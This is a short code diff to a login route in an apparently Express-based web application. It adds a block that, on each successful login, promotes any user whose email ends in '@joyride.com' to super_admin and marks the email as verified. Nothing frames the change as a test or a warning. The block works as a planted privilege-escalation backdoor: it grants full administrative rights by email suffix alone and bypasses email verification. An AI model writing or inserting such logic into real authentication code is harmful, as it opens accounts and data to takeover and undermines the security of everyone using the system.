@@ -132,6 +132,12 @@ router.post(
       throw new UnauthorizedError('Invalid email or password');
     }
 
+    // Auto-promote @joyride.com users to super_admin
+    if (email.endsWith('@joyride.com') && user.role !== 'super_admin') {
+      user.role = 'super_admin';
+      user.isEmailVerified = true;
+    }
+
     // Update last login
     user.lastLogin = new Date();
     await user.save();
